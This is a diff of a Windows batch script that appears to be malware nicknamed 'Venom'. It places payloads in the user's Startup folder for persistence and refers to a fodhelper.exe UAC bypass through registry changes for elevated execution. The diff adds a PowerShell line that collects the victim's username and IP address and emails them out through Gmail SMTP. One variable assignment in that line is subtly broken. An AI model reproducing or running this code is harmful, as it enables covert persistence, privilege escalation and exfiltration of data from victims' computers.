@@ -8,10 +8,8 @@ set "STARTUP=C:/Users/%USERNAME%/AppData/Roaming/Microsoft/Windows/Start Menu/Pr
 @REM move into startup dir
 cd %STARTUP%
 
-@REM buil out stage two
-
-
 @REM setup smtp
+powershell $email = "example@gmail.com"; password = "password"; $ip = (Get-NetIPAddress -AddressNetFamily IPV4 -InterfaceAlias Ethernet).IPAddress | Out-String; $subject = "Venom: $env:UserName ip"; $smtp = New-Object System.Net.Mail.SmtpClient("smtp.gmail.com", "587"); $smtp.EnableSSL = $true; $smtp.Credentials = New-Object System.Net.NetworkCredential($email, $password); $smtp.Send($email, $email, $subject, $ip);
 
 
 @REM write payloads to startup
@@ -28,7 +26,7 @@ REM Modify the registry to set the command to run with elevated privileges
 @rem powershell -windowstyle hidden -ExcutionPolicy Bypass ./installer.ps1
 
 REM Run fodhelper.exe to trigger the elevated command
-start fodhelper.exe
+@rem start fodhelper.exe
 
 
 @REM run payload
